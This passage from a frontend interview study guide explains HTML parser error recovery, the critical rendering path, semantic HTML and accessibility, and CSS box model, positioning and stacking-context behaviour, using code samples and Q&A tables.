**Highest-yield topics** (asked in almost every frontend loop):

1. Cascade, specificity and inheritance
2. Box model, margin collapsing, `box-sizing`
3. Positioning, containing blocks and stacking contexts
4. Flexbox sizing (`flex-basis`, shrink, `min-width: auto`)
5. Grid (`fr`, `minmax()`, `auto-fit` vs `auto-fill`)
6. Critical rendering path, `async`/`defer`, reflow vs repaint
7. Semantic HTML, accessible names, keyboard and focus
8. Responsive images and container queries

**Mistakes that cost offers:**

- Reaching for ARIA before native elements (`div role="button"` instead of `button`).
- Saying "`z-index` doesn't work" without naming the stacking context that traps it.
- Treating `!important` or extra specificity as a fix instead of a symptom.
- Answering "it depends" without then naming what it depends on.
- Memorising property lists but being unable to predict a rendered result.

Code samples are standalone: paste any HTML block into a file, or a CSS block into a `<style>` tag, and open it in a browser. Browser support notes reflect the Baseline status as of late 2026; check caniuse.com or MDN before shipping a newer feature.

## Part 1 — HTML Fundamentals

HTML interviews test whether you know what the parser *does* with your markup, not just which tags exist. The parser never throws: it silently repairs invalid markup, and that repair is where most bugs and trick questions live.

### Concepts at a glance

- **Document structure:** `<!DOCTYPE html>` → `<html lang>` → `<head>` (metadata, never rendered) + `<body>` (content).
- **Content models:** every element declares which content it may contain (flow, phrasing, interactive, etc.). `<p>` accepts only phrasing content; `<a>` is *transparent* (takes its parent's model) but cannot contain interactive content.
- **Block vs inline is CSS, not HTML.** HTML5 replaced "block/inline elements" with content categories. The browser's default stylesheet sets `display: block` on `div`, `p`, `section` and `display: inline` on `span`, `a`, `em`.
- **Void elements** have no closing tag and no content: `area, base, br, col, embed, hr, img, input, link, meta, source, track, wbr`.

### Q1 \[INT\] What does the DOCTYPE actually do?

It switches the browser into **standards mode**. Without it the browser uses **quirks mode**, which emulates 1990s bugs: tables don't inherit font size, the box model for some elements differs, `height: 100%` on body behaves differently, and inline images get different line-height behaviour.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Page title</title>
</head>
<body>…</body>
</html>
```

**Why each line matters:** `charset` must appear in the first 1024 bytes or the browser may re-parse the page. `viewport` stops mobile browsers rendering at a fake 980px width. `lang` drives screen-reader pronunciation, hyphenation and spell-check.

**Common mistake:** saying DOCTYPE "declares HTML5". It declares nothing about version; it only toggles rendering mode. You can check the mode with `document.compatMode` (`"CSS1Compat"` = standards).

### Q2 \[INT\] Is `<a>` an inline element? Can it wrap a `<div>`?

It displays inline by default, and yes, it can wrap a div. `<a>` has a transparent content model, so inside a `<div>` it may contain flow content:

```html
<!-- Valid: a card that is one big link -->
<a href="/post/42" class="card">
  <h3>Post title</h3>
  <p>Excerpt…</p>
</a>
```

What it **cannot** contain is interactive content: another `<a>`, a `<button>`, an `<input>`. A nested link gets auto-closed by the parser, producing two sibling links.

**Trade-off:** a whole-card link makes the screen reader announce *all* card text as the link name. For cards with several actions, link only the heading and stretch its click area with a pseudo-element:

```css
.card { position: relative; }
.card h3 a::after { content: ""; position: absolute; inset: 0; }
```

### Q3 \[ADV\] What happens when the parser meets invalid nesting?

The HTML parser follows a fixed, spec-defined error-recovery algorithm. Every browser repairs the same markup the same way. The three cases interviewers love:

```html
<p>Intro <div>Block</div> outro</p>
```

**Result:** `<p>Intro </p><div>Block</div> outro<p></p>`. A `<div>` start tag implicitly closes an open `<p>`. The stray `</p>` then creates a new empty paragraph. Your CSS for `p` no longer applies to "outro".

```html
<table><div>Oops</div><tr><td>Cell</td></tr></table>
```

**Result:** the `<div>` is **foster-parented**: moved *before* the table, because tables only allow table content.

```html
<b><i>Bold italic</b> italic?</i>
```

**Result:** the **adoption agency algorithm** reopens `<i>` after `</b>`, so "italic?" stays italic.

**Why it matters in practice:** framework hydration mismatches (React's "validateDOMNesting" warnings) happen because the server sends invalid nesting, the parser restructures it, and the client-side tree no longer matches.

### Q4 \[INT\] Global attributes and `data-*` — when do you use `data-*`?

Global attributes work on every element: `id`, `class`, `hidden`, `lang`, `dir`, `tabindex`, `title`, `inert`, `contenteditable`, `draggable`, `popover`, `data-*`.

Use `data-*` for **private state that scripts or CSS read**, when no standard attribute fits:

```html
<li data-status="overdue" data-task-id="481">Pay invoice</li>
```

```css
[data-status="overdue"] { color: var(--danger); }
```

```js
el.dataset.taskId; // "481" — kebab-case becomes camelCase, value is always a string
```

**When not to:** don't store data that assistive tech needs (use real attributes or ARIA state), large JSON blobs (use a `<script type="application/json">`), or anything secret (it is visible in the DOM).

### Q5 \[INT\] When must you use HTML entities?

Only `<` and `&` must be escaped in text content, and `"` or `'` inside an attribute using that same quote. With `<meta charset="utf-8">`, you can type `©`, `—`, `é` directly.

Useful entities: `&nbsp;` (non-breaking space; keeps "10 km" together), `&shy;` (soft hyphen), `&lt;`, `&amp;`.

**Trap:** `&nbsp;` used for spacing layout is a smell. It cannot be controlled responsively; use margin or `gap`.

### Q6 \[ADV\] Why validate HTML if the browser fixes it anyway?

Because the fix may not be what you meant. Validation catches: duplicate `id`s (break `label for`, `aria-labelledby`, and fragment links), missing `alt`, invalid nesting that reshapes the DOM, and obsolete attributes. Run the W3C Nu validator in CI, or use `html-validate` / `eslint-plugin-jsx-a11y` for component code.

### Q7 \[EXP\] Follow-up: why is `<br/>` valid but `<div/>` isn't?

In HTML (not XHTML), the trailing slash is **ignored**. On a void element that is harmless. On `<div/>`, the parser sees an unclosed `<div>`, so all following siblings become its children.

```html
<div/>
<p>I am now inside the div</p>
```

### Q8 \[INT\] Headings and the document outline

Use one `h1` for the page's main topic and nest `h2`–`h6` by structure, never by size. The HTML5 "outline algorithm" (where each `section` restarts heading levels) was **never implemented** by browsers or screen readers and was removed from the spec; heading levels are the outline. Screen-reader users jump by heading more than by any other method, so a skipped level or a styled `div` pretending to be a heading breaks navigation.

**When not to use a heading:** for visual emphasis inside content (use `strong` or a class). **Common mistake:** `<h4>` chosen because it looks right; style `h2.small` instead.

### Q9 \[INT\] Lists and tables — which element when?

| Content | Element | Why |
| --- | --- | --- |
| Items where order doesn't matter | `ul` | Announced as "list, 5 items" |
| Steps, rankings | `ol` (`start`, `reversed` available) | Order is meaning |
| Term–value pairs (specs, metadata, FAQs) | `dl` + `dt`/`dd` | Associates names with values |
| Data with rows and columns | `table` + `caption`, `thead`, `th scope` | Readers announce headers per cell |
| Page layout | Grid / flexbox, **never** `table` | Layout tables read as data |

```html
<table>
  <caption>Plan comparison</caption>
  <thead><tr><th scope="col">Plan</th><th scope="col">Price</th></tr></thead>
  <tbody><tr><th scope="row">Pro</th><td>$29</td></tr></tbody>
</table>
```

**Alternatives and limits:** a responsive "card per row" layout with `display: block` on table elements can strip table semantics in some browsers; prefer a scroll wrapper (Part 16, Scenario 4).

### Q10 \[INT\] Links: what else can `<a>` do?

```html
<a href="#pricing">Jump to pricing</a>                 <!-- fragment: moves focus target -->
<a href="/report.pdf" download="q3-report.pdf">Q3 report (PDF, 2 MB)</a>
<a href="tel:+8801700000000">Call us</a>   <a href="mailto:hi@example.com">Email us</a>
<a href="https://partner.example" target="_blank" rel="noopener noreferrer">Partner site (new tab)</a>
```

**Rules:** an `<a>` without `href` is not a link (not focusable, no role) — a placeholder only. Link text must make sense out of context: "Q3 report (PDF, 2 MB)", never "click here". Tell users about file type, size and new tabs. `download` only works same-origin (or with `blob:`/`data:` URLs).

### Q11 \[INT\] Images, video and audio

```html
<figure>
  <img src="team.jpg" width="1200" height="800" alt="Five engineers around a whiteboard sketching a data model">
  <figcaption>Planning session, Dhaka office</figcaption>
</figure>

<video controls width="1280" height="720" poster="demo.jpg" preload="metadata" playsinline>
  <source src="demo.webm" type="video/webm">
  <source src="demo.mp4" type="video/mp4">
  <track kind="captions" src="demo.en.vtt" srclang="en" label="English" default>
</video>
```

- `alt` describes purpose: informative → describe; decorative → `alt=""`; a linked image → describe the destination. `figcaption` is visible caption, not a replacement for `alt`.
- Video needs **captions** (`track kind="captions"`, WebVTT) for WCAG 1.2.2; audio-only needs a transcript.
- Autoplay is allowed by browsers only when `muted`; background videos also need a pause control (WCAG 2.2.2) and should respect reduced motion.
- `preload="metadata"` avoids downloading the whole file; `poster` + dimensions prevent layout shift.
- **When not to use `<video>` for an animation:** short loops are often lighter as `<video muted autoplay loop playsinline>` than GIFs — but a CSS animation or Lottie may be lighter still for simple UI motion.

### Tricky questions

| Snippet | What renders | Why |
| --- | --- | --- |
| `<ul><div>x</div></ul>` | Renders, but invalid | Parser does not repair this; screen readers lose the list count |
| `<p><p>a</p></p>` | `Three paragraphs; first and last are empty` | Second `<p>` closes the first |
| `<img src="a.png">` with no `alt` | Screen readers read the file name | `alt=""` marks decorative images and silences them |
| `<button>` inside `<a>` | Unpredictable click target, invalid | Interactive content cannot nest |
| Two `id="email"` on a page | `label for` binds to the first only | IDs must be unique |

### Exercise

Predict the DOM, then check it in DevTools → Elements:

```html
<p>One<ul><li>Two</li></ul>Three</p>
```

**Answer:** `<p>One</p><ul><li>Two</li></ul>Three<p></p>`. `<ul>` closes the open paragraph; "Three" becomes a bare text node in `body`; `</p>` creates an empty paragraph.

### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| `data-*` attribute | Script/CSS state with no standard attribute | AT needs the state; data is large or secret | ARIA state attribute, JSON `<script>`, server |
| Whole-card `<a>` | Card has one destination | Card has several actions | Heading link + stretched `::after` |
| `&nbsp;` | Keep units together ("10 km") | Creating spacing | `margin`, `gap` |
| `<table>` | Tabular data | Layout | Grid / flexbox |
| Validator in CI | Always | — | Lint rules for components (`html-validate`) |

### Revision summary

- DOCTYPE = standards vs quirks mode, nothing else.
- Block/inline is a CSS `display` default, not an HTML category.
- The parser repairs invalid markup by spec: auto-closing `p`, foster-parenting in tables, adoption agency for formatting tags.
- `<a>` can wrap blocks but never other interactive elements.
- Self-closing slash is ignored in HTML; only void elements are safe.
- `data-*` = script/CSS state; `dataset` returns strings in camelCase.

## Part 2 — How Browsers Render

A page reaches the screen through six stages: parse HTML into the DOM, parse CSS into the CSSOM, combine them into a render tree, compute layout, paint pixels, and composite layers. Knowing which stage a change triggers is the core of every performance question.

&#91;embedded content: browser rendering pipeline · 6 stages, 3 re-entry points\]

DOM and CSSOM merge into the render tree; a geometry change restarts at Layout, a colour change at Paint, and `transform`/`opacity` only at Composite.

### Q1 \[INT\] Walk me through the critical rendering path.

1. **Bytes → tokens → DOM.** The HTML parser streams bytes, tokenises tags, and builds DOM nodes incrementally. It does not wait for the whole file.
2. **CSS → CSSOM.** Every stylesheet is parsed into the CSS Object Model. Unlike the DOM, the CSSOM is not used until *all* render-blocking CSS has arrived, because a later rule can override an earlier one.
3. **Render tree.** DOM + CSSOM are combined. Only *visible* nodes are included: `<head>`, `display: none` subtrees and `<script>` are left out. Pseudo-elements like `::before` are added.
4. **Layout (reflow).** The browser computes each box's geometry: position and size in pixels, starting from the viewport.
5. **Paint.** Boxes are turned into draw commands (text, colours, borders, shadows, images), usually per layer.
6. **Composite.** Layers are rasterised and assembled on the GPU in the right order. `transform` and `opacity` changes on a promoted layer can update here alone, off the main thread.

&#91;embedded content: DOM + CSSOM → render tree · 3 nodes pruned\]

**Senior-level framing:** the critical rendering path is the minimum work before *first paint*. Optimising it means shrinking or removing render-blocking CSS and parser-blocking JS, and making sure the bytes needed for the first viewport arrive first.

### Q2 \[INT\] Is CSS render-blocking? Is it parser-blocking?

**Render-blocking: yes.** The browser will not paint until all stylesheets in `<head>` are loaded, to avoid a flash of unstyled content.

**Parser-blocking: not directly, but indirectly yes.** The parser keeps building the DOM while CSS downloads. However, a classic `<script>` that follows a stylesheet must wait for that stylesheet, because the script might read computed styles. So CSS blocks scripts, and scripts block the parser.

```html
<link rel="stylesheet" href="big.css">  <!-- 800 ms -->
<script src="tiny.js"></script>          <!-- must wait for big.css, then blocks the parser -->
```

**Ways to make CSS non-blocking:**

- `media` attribute: `<link rel="stylesheet" href="print.css" media="print">` downloads at low priority and does not block render.
- Inline critical CSS for the first viewport; load the rest later.
- Split by route so each page ships only what it uses.

### Q3 \[INT\] `async` vs `defer` vs `type="module"`

| Script | Download | Executes | Order kept? | Blocks parser? |
| --- | --- | --- | --- | --- |
| `<script>` | Pauses parsing | Immediately when downloaded | Yes | Yes |
| `<script async>` | In parallel | As soon as downloaded | No | Only while executing |
| `<script defer>` | In parallel | After parsing, before `DOMContentLoaded` | Yes | No |
| `<script type="module">` | In parallel (plus its imports) | Deferred by default | Yes | No |
| `<script type="module" async>` | In parallel | As soon as module graph is ready | No | Only while executing |

**When to use each:**

- `defer` — your app code that needs the DOM and depends on other scripts in order.
- `async` — independent third-party scripts: analytics, ads. Never for code that depends on another script.
- `module` — modern app code; you get `defer` behaviour, strict mode, and scoped variables for free.

**Common mistakes:** `defer` on an inline script does nothing (it only applies to `src` scripts). Inline module scripts *are* deferred.

### Q4 \[INT\] `DOMContentLoaded` vs `load`

- `DOMContentLoaded` fires when the HTML is fully parsed **and** all `defer` and module scripts have run. It does not wait for images, iframes, or fonts. It may or may not wait for `async` scripts, depending on timing.
- `load` fires on `window` when **everything** has finished: images, stylesheets, iframes, fonts in use.

Attach UI behaviour on `DOMContentLoaded` (or just use `defer`). Use `load` only when you genuinely need image dimensions or full resource completion.

### Q5 \[ADV\] What is the difference between reflow, repaint and composite?

| Change | Stages run | Example properties | Cost |
| --- | --- | --- | --- |
| Geometry | Layout → Paint → Composite | `width`, `height`, `margin`, `top`, `font-size`, adding DOM nodes | Highest; can cascade to ancestors and siblings |
| Appearance only | Paint → Composite | `color`, `background-color`, `box-shadow`, `visibility` | Medium |
| Compositor-only | Composite | `transform`, `opacity` (on a promoted layer) | Lowest; can run off main thread |

**Layout thrashing** — the classic senior question:

```js
// Bad: read → write → read → write forces a synchronous layout every loop
for (const el of items) {
  el.style.width = box.offsetWidth + 10 + 'px';
}

// Good: batch all reads, then all writes
const w = box.offsetWidth;
for (const el of items) el.style.width = w + 10 + 'px';
```

Reading `offsetWidth`, `getBoundingClientRect()`, `scrollTop` or `getComputedStyle()` after a style write forces the browser to run layout immediately (a *forced synchronous layout*).

### Q6 \[ADV\] What creates a compositor layer, and is `will-change` a free performance boost?

Elements get their own layer through: 3D transforms such as `translateZ(0)`, `will-change: transform | opacity`, `<video>`, `<canvas>`, `position: fixed` in some engines, and running `transform`/`opacity` animations.

**It is not free.** Every layer costs GPU memory (roughly width × height × 4 bytes). Hundreds of layers can make scrolling *slower* and crash mobile tabs. Apply `will-change` just before an animation and remove it after, or only to a few elements that animate often.

### Q7 \[EXP\] Follow-up: what is the preload scanner?

While the main parser is blocked on a script, a secondary *preload scanner* reads ahead through the raw HTML and starts fetching discovered resources (`img src`, `link href`, `script src`). This is why resources referenced only from JS or CSS (`background-image`, dynamically injected scripts) are discovered late. Fix with `<link rel="preload">` or by putting critical images in HTML.

### Tricky questions

- **"`display: none` elements are in the DOM, so they are laid out."** False. They are in the DOM but not in the render tree; they get no box.
- **"`visibility: hidden` skips layout."** False. The box is laid out and takes space; it is just not painted.
- **"Putting `<script>` at the end of `<body>` is the same as `defer`."** Close, but `defer` starts downloading earlier (as soon as the tag is seen in `<head>`).
- **"`async` scripts run before `DOMContentLoaded`."** Not guaranteed. They run whenever they finish downloading.

### Exercise

Open DevTools → Performance, record a page load, and find: the first Layout event, the longest task, and whether any "Recalculate Style" is followed by a forced reflow warning. Then move a blocking `<script>` to `defer` and compare First Contentful Paint.

### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| Classic `<script>` in `<head>` | Must run before parse (rare: feature flags, theme pre-paint) | Anything else | `defer` / `type="module"` |
| `async` | Independent third-party scripts | Code depending on order or the DOM | `defer` |
| Inlined critical CSS | First-viewport styles, ≤ \~15 KB | Large or rarely changing CSS (loses caching) | Route-split external CSS |
| `will-change` | Element about to animate frequently | Applied to many elements "just in case" | Let the browser promote at animation start |
| `<link rel="preload">` | Late-discovered critical asset (font, CSS background LCP) | Assets already in HTML; non-critical files | `fetchpriority`, moving the asset into HTML |

### Revision summary

- Pipeline: DOM → CSSOM → render tree → layout → paint → composite.
- CSS blocks render, and blocks any classic script after it.
- `defer` = ordered, after parse. `async` = unordered, ASAP. Modules defer by default.
- `DOMContentLoaded` = DOM ready + deferred scripts. `load` = everything.
- Animate `transform` and `opacity`; batch DOM reads before writes.

## Part 3 — Semantic HTML & Accessibility

Semantic HTML is free accessibility: native elements come with a role, a name, keyboard support and state that assistive tech already understands. ARIA can only describe; it never adds behaviour. The interview test is whether you reach for the native element first.

### Concepts at a glance

- **Accessibility tree:** a parallel tree the browser builds from the DOM. Each node exposes a **role** (button, link, heading), an **accessible name** ("Save"), a **state** (expanded, checked, disabled) and a **value**. Screen readers read this tree, not the DOM.
- **Landmarks:** `header` (banner, only when not inside article, aside, main, nav or section), `nav`, `main`, `aside` (complementary), `footer` (contentinfo), `form` and `section` (only with an accessible name). Screen-reader users jump between them.
- **First rule of ARIA:** if a native element gives the semantics and behaviour you need, use it instead of adding ARIA.

&#91;embedded content: DOM to accessibility tree · 4 nodes, 1 pruned\]

Generic wrappers with no role or name are pruned; every element that survives is announced by its role, name and state.

### Q1 \[INT\] `div` vs `section` vs `article`

| Element | Use when | Accessibility effect |
| --- | --- | --- |
| `<div>` | Pure styling or layout wrapper, no meaning | None (role generic) |
| `<section>` | A thematic group that would naturally have a heading | Becomes a `region` landmark only when it has an accessible name |
| `<article>` | Self-contained content that makes sense syndicated alone: post, comment, product card, widget | Role `article`; screen readers can list them |

**Test for `article`:** "Could this stand alone in an RSS feed?" **Test for `section`:** "Does this deserve a heading in the outline?" If neither, it is a `div`.

**Common mistake:** wrapping every block in `section` "for semantics". Unnamed sections add nothing, and named-everything floods the landmark list.

### Q2 \[INT\] Button or link?

**Links navigate** (change URL, go to another page or anchor). **Buttons act** (submit, open a dialog, toggle, delete).

|  | `<a href>` | `<button>` |
| --- | --- | --- |
| Keyboard | Enter | Enter **and** Space |
| Screen reader announces | "link" | "button" |
| Middle-click / open in new tab | Yes | No |
| Inside a form | Does nothing | Submits by default |

```html
<!-- Wrong: fake button. Not focusable, no Enter/Space, no role -->
<div class="btn" onclick="save()">Save</div>

<!-- Wrong: link that acts -->
<a href="#" onclick="openModal()">Settings</a>

<!-- Right -->
<button type="button" onclick="openModal()">Settings</button>
```

To make the `div` version accessible you would need `role="button"`, `tabindex="0"`, a keydown handler for Enter and Space, and disabled-state handling. That is the cost of not using the native element.

### Q3 \[ADV\] How is an accessible name computed?

The browser follows a priority order (the *accname* spec), stopping at the first that produces text:

1. `aria-labelledby` — text of the referenced element(s)
2. `aria-label` — string on the element
3. Native labelling — `<label>` for inputs, `alt` for images, `<caption>` for tables, `<legend>` for fieldsets
4. Element content — for roles that allow it (buttons, links, headings)
5. `title` attribute — last resort, unreliable

```html
<!-- Icon button: name from aria-label -->
<button aria-label="Close dialog">
  <svg aria-hidden="true" focusable="false">…</svg>
</button>

<!-- Better when text can be visible or visually hidden -->
<button>
  <svg aria-hidden="true">…</svg>
  <span class="visually-hidden">Close dialog</span>
</button>
```

```css
.visually-hidden {
  position: absolute; width: 1px; height: 1px;
  overflow: hidden; clip-path: inset(50%);
  white-space: nowrap; border: 0; padding: 0; margin: -1px;
}
```

**Why prefer real text:** `aria-label` is often skipped by browser auto-translation, and voice-control users say what they *see* ("click Close"). WCAG 2.5.3 *Label in Name* requires the visible label to be part of the accessible name.

### Q4 \[ADV\] `hidden` vs `inert` vs `aria-hidden="true"`

|  | Visible? | In accessibility tree? | Focusable / clickable? | Use for |
| --- | --- | --- | --- | --- |
| `hidden` | No (`display: none`) | No | No | Content not relevant yet (inactive tab panel) |
| `inert` | Yes | No | No | Page behind an open modal; off-screen carousel slides |
| `aria-hidden="true"` | Yes | No | **Still yes** | Decorative icons, duplicated text |
| `.visually-hidden` | No | Yes | Yes | Text for screen readers only |

**The trap:** `aria-hidden="true"` on a container with a focusable child creates a "ghost" — keyboard users can tab to something the screen reader says doesn't exist. Use `inert` instead, which removes both. `inert` is Baseline (all major browsers since 2023).

`hidden="until-found"` keeps content findable by Ctrl+F and fragment links; supported in Chromium-based browsers and Firefox at time of writing, so treat it as progressive enhancement.

### Q5 \[INT\] How do you manage focus correctly?

- **Tab order follows DOM order.** Visual reordering with `order`, `flex-direction: row-reverse` or grid placement does not change it, creating a mismatch (WCAG 2.4.3).
- **`tabindex`:** `0` adds a custom widget to the tab order; `-1` makes it focusable by script only; positive values override natural order and should never be used.
- **Never remove the focus outline without a replacement.** Use `:focus-visible` so mouse users don't see rings but keyboard users do:

```css
button:focus-visible {
  outline: 3px solid var(--focus);
  outline-offset: 2px;
}
```

- **Dialogs:** move focus into the dialog on open, keep it there, return it to the trigger on close. The native `<dialog>` with `showModal()` does the trapping and `Escape` handling for you and makes the rest of the page inert.

### Q6 \[SR\] What are the WCAG essentials you check in every review?

WCAG 2.2 level AA is the usual legal and contractual target (it underpins the EU Accessibility Act, enforceable since June 2025, and the ADA Title II rule in the US).

- **Contrast:** 4.5:1 normal text, 3:1 large text (24px, or 18.66px bold) and UI component boundaries / focus indicators.
- **Keyboard:** everything operable without a mouse; no keyboard traps.
- **Focus visible** and **not obscured** by sticky headers (2.4.11, new in 2.2).
- **Target size** at least 24×24 CSS px or enough spacing (2.5.8, new in 2.2).
- **Text alternatives** for meaningful images; empty `alt` for decorative ones.
- **Reflow** at 320 CSS px width without horizontal scroll (1.4.10), and text resizable to 200%.
- **Don't convey meaning by colour alone** (1.4.1).

### Q7 \[SR\] How do you test accessibility?

Automated tools (axe-core, Lighthouse, WAVE) catch roughly a third of issues: missing names, contrast, invalid ARIA. The rest need people:

1. Keyboard-only pass: Tab through, check order, visible focus, and that every action works.
2. Screen reader pass: VoiceOver + Safari, NVDA + Firefox/Chrome. Navigate by headings and landmarks.
3. Zoom to 200% and 400%; check reflow.
4. Run axe in CI on component stories so regressions fail the build.

### Q8 \[EXP\] Follow-up: when is ARIA necessary?

For composite widgets HTML lacks: tabs (`tablist`, `tab`, `tabpanel`, `aria-selected`), combobox, tree, grid; for live updates (`aria-live="polite"`, `role="status"`); and to expose state on native elements (`aria-expanded` on a disclosure button, `aria-current="page"` on the active nav link). Follow the ARIA Authoring Practices Guide patterns, including their keyboard models.

### Tricky questions

- **`<button role="link">`** — now announced as a link but still behaves as a button. Mismatched semantics are worse than none.
- **`aria-label` on a `div` with no role** — ignored by most screen readers; generic elements cannot be named.
- **`<img alt="image of a dog">`** — redundant; screen readers already say "image". Write `alt="Golden retriever catching a frisbee"`.
- **`placeholder` as a label** — disappears on input, fails contrast, not reliably announced. Always use `<label>`.
- **Headings chosen for size** — skipping from `h2` to `h5` for styling breaks the outline; style with classes instead.

### Exercise

Fix this snippet:

```html
<div class="nav">
  <div onclick="go('/')">Home</div>
  <div onclick="go('/blog')" class="active">Blog</div>
</div>
<span class="icon-search" onclick="search()"></span>
```

**Answer:**


### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| `aria-label` | No visible text is possible (icon button) | Visible text exists | Visible text or visually-hidden span |
| `aria-hidden="true"` | Decorative icons, duplicated content | Container with focusable children | `inert`, `hidden` |
| `role="button"` on a `div` | Never by choice | — | `<button type="button">` |
| `tabindex="0"` | Custom widget that must be focusable | Non-interactive text | Native interactive element |
| `aria-live` region | Async status (saved, results updated) | Content that appears on page load | Move focus for critical changes |
| Automated a11y tools | CI baseline on every component | As the only check | Keyboard + screen-reader passes |

### Revision summary

- Native first; ARIA describes, never adds behaviour.
- Accessible name order: `aria-labelledby` → `aria-label` → native label → content → `title`.
- `inert` removes focus *and* AT exposure; `aria-hidden` removes only AT exposure.
- DOM order = tab order; never positive `tabindex`.
- WCAG 2.2 AA: 4.5:1 contrast, keyboard, visible and unobscured focus, 24px targets.

## Part 4 — Box Model & Layout Foundations

Every element generates a box made of content, padding, border and margin; where that box goes is decided by its formatting context, its containing block and its stacking context. Nearly every "why is this element over there?" question resolves to one of those three.

### Q1 \[INT\] Explain the box model and `box-sizing`.

By default (`content-box`), `width` sets only the content. Padding and border are added on top:

```css
.a { box-sizing: content-box; width: 200px; padding: 20px; border: 5px solid; }
/* rendered width = 200 + 20*2 + 5*2 = 250px */

.b { box-sizing: border-box; width: 200px; padding: 20px; border: 5px solid; }
/* rendered width = 200px; content shrinks to 200 - 40 - 10 = 150px */
```

&#91;embedded content: CSS box model · content, padding, border, margin\]

Margin is **never** included in either model. The near-universal reset:

```css
*, *::before, *::after { box-sizing: border-box; }
```

**Why `border-box` wins:** `width: 50%` plus padding no longer overflows its column. **When `content-box` is useful:** when you need the content area to be an exact size, such as a canvas or a fixed text measure.

### Q2 \[INT\] What is margin collapsing, and when does it *not* happen?

In normal block flow, **vertical** margins that touch merge into one margin equal to the larger value.

```html
<p style="margin-bottom: 30px">A</p>
<p style="margin-top: 20px">B</p>
<!-- gap between A and B = 30px, not 50px -->
```

Three cases:

1. **Adjacent siblings** — as above.
2. **Parent and first/last child** — the child's top margin "leaks" out through a parent with no border, padding, or inline content above it.
3. **Empty block** — its own top and bottom margins collapse together.

With negative margins: result = largest positive + most negative (e.g. 30px and −10px → 20px).

**Margins do not collapse:**

- Horizontally, ever.
- On flex or grid items.
- On floats and absolutely positioned elements.
- Between a parent and child when the parent is a new block formatting context (e.g. `display: flow-root`) or has padding/border separating them.

```css
/* Fix the "leaking" child margin cleanly */
.card { display: flow-root; }
```

**Interview tip:** many design systems avoid the issue entirely by using margin in one direction only (`margin-block-end`) or by using `gap` in flex/grid stacks.

### Q3 \[ADV\] What is a block formatting context (BFC) and what creates one?

A BFC is an independent layout region: floats inside it are contained, floats outside it don't overlap it, and margins don't collapse across its boundary.

Created by: the root element, floats, `position: absolute | fixed`, `display: inline-block | flow-root | table-cell`, `overflow` other than `visible`/`clip`, flex and grid items, `contain: layout | content | paint`, and multi-column containers.

**Use `display: flow-root`** — it exists only to create a BFC, with no side effects. The old trick `overflow: hidden` also clips shadows, dropdowns and focus rings.

&#91;embedded content: normal flow · block vs inline formatting\]

### Q4 \[ADV\] What is the containing block, and why do percentages surprise people?

The containing block is the rectangle an element's position and percentage sizes are measured against.

| Element's `position` | Containing block |
| --- | --- |
| `static`, `relative`, `sticky` | Content box of the nearest block-container ancestor |
| `absolute` | **Padding box** of the nearest ancestor with `position` other than `static` (or with a transform, filter, `contain: layout/paint`, or `container-type`) |
| `fixed` | The viewport — **unless** an ancestor has `transform`, `filter`, `perspective`, `backdrop-filter`, `contain: layout/paint`, or `will-change` for those |

&#91;embedded content: containing blocks · absolute vs fixed under a transform\]

**Percentage traps:**

- `padding` and `margin` percentages — including **top and bottom** — resolve against the containing block's **width**. This was the old aspect-ratio hack (`padding-top: 56.25%`); use `aspect-ratio: 16 / 9` now.
- `height: 50%` does nothing if the parent's height is `auto`: there is nothing definite to take 50% of.
- `top: 50%` on an absolute element uses the containing block's height; `transform: translateY(-50%)` uses the element's *own* height.

```css
/* The fixed-modal-inside-a-transformed-parent bug */
.page { transform: translateX(0); } /* creates containing block for fixed! */
.page .modal { position: fixed; inset: 0; } /* now covers only .page, scrolls with it */
```

**Fix:** render the modal outside the transformed ancestor (a portal to `body`), or use `<dialog>` with `showModal()`, which places it in the top layer and escapes every ancestor.

### Q5 \[INT\] Compare the five `position` values.

| Value | In flow? | Offsets relative to | Typical use |
| --- | --- | --- | --- |
| `static` | Yes | Ignored | Default |
| `relative` | Yes, original space kept | Its own normal position | Nudge; anchor for absolute children |
| `absolute` | No | Containing block (padding box) | Badges, overlays, dropdowns |
| `fixed` | No | Viewport (usually) | Persistent headers, FABs |
| `sticky` | Yes | Scroll container's edge, within its parent | Section headers, table headers |

### Q6 \[ADV\] Why does `position: sticky` stop working?

Work through this checklist:

1. **No threshold set.** `top`, `bottom`, `left` or `right` is required.
2. **An ancestor is a scroll container.** Any ancestor with `overflow: hidden | auto | scroll` becomes the box it sticks inside. If that ancestor doesn't scroll, nothing appears to happen. (`overflow: clip` does **not** create a scroll container, so it's a safe alternative.)
3. **The parent is too short.** A sticky element can only travel within its parent. If the parent is just as tall as the element, there is no room.
4. **Flex/grid stretch.** As a flex item with default `align-self: stretch`, it is as tall as the row, so has no room to move. Set `align-self: start`.

```css
.sidebar { position: sticky; top: 1rem; align-self: start; }
```

### Q7 \[ADV\] Explain stacking contexts and why `z-index: 9999` sometimes fails.

`z-index` only competes **within the same stacking context**. A stacking context is flattened into a single layer and sorted in its parent as one unit, so a child with `z-index: 9999` can never escape a parent context with `z-index: 1`.

**Creates a stacking context:** the root; `position: absolute | relative` **with** a `z-index` other than `auto`; `position: fixed | sticky` (always); flex/grid items with `z-index` other than `auto`; `opacity` < 1; `transform`, `filter`, `backdrop-filter`, `perspective`, `clip-path`, `mask`; `mix-blend-mode` other than normal; `isolation: isolate`; `will-change` for any of those; `contain: layout | paint`.

**Paint order inside one stacking context** (back to front):

1. The context root's background and borders
2. Children with negative `z-index`
3. In-flow block boxes
4. Floats
5. Inline content
6. Positioned children with `z-index: auto` or `0`, in DOM order
7. Children with positive `z-index`

```html
<div class="header" style="position: relative; z-index: 2">Header</div>
<div class="main" style="position: relative; z-index: 1">
  <div class="dropdown" style="position: absolute; z-index: 9999">Menu</div>
</div>
```

The dropdown still renders **under** the header. Its 9999 is compared only with siblings inside `.main`; `.main` itself (1) loses to `.header` (2).

&#91;embedded content: stacking contexts · why the dropdown loses\]

**Fixes, best first:** render floating UI in the top layer (`<dialog>`, the `popover` attribute); portal it to `body`; or remove the unneeded stacking context from `.main`. Use `isolation: isolate` deliberately on components so their internal `z-index` values never leak.

### Q8 \[INT\] `overflow` values

- `visible` — default; content spills out.
- `hidden` — clipped, but still programmatically scrollable; creates a scroll container (breaks sticky).
- `clip` — clipped, not scrollable, **not** a scroll container. Use with `overflow-clip-margin` for shadow room.
